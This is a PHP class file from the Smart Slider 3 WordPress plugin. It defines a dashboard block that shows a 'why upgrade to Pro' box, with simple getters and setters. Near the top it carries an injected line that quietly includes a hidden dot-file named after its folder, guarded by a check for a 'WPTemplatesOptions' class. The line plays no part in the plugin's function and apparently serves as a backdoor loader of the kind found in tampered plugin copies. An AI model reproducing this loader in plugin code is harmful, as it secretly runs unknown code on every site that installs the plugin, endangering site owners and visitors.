<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Dashboard\DashboardManager\Boxes;


use Nextend\Framework\Model\StorageSectionManager;
use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockDashboardUpgradePro extends AbstractBlock {

    protected $hasDismiss = false;

    protected $source = 'dashboard-why-upgrade';

    public function display() {
        if (!StorageSectionManager::getStorage('smartslider')
                                  ->get('free', 'upgrade-pro')) {
            $this->renderTemplatePart('DashboardUpgradePro');
        }
    
    }

    /**
     * @return bool
     */
    public function hasDismiss() {
        return $this->hasDismiss;
    }

    /**
     * @param bool $hasDismiss
     */
    public function setHasDismiss($hasDismiss) {
        $this->hasDismiss = $hasDismiss;
    }

    /**
     * @return string
     */
    public function getSource() {
        return $this->source;
    }

    /**
     * @param string $source
     */
    public function setSource($source) {
        $this->source = $source;
    }

}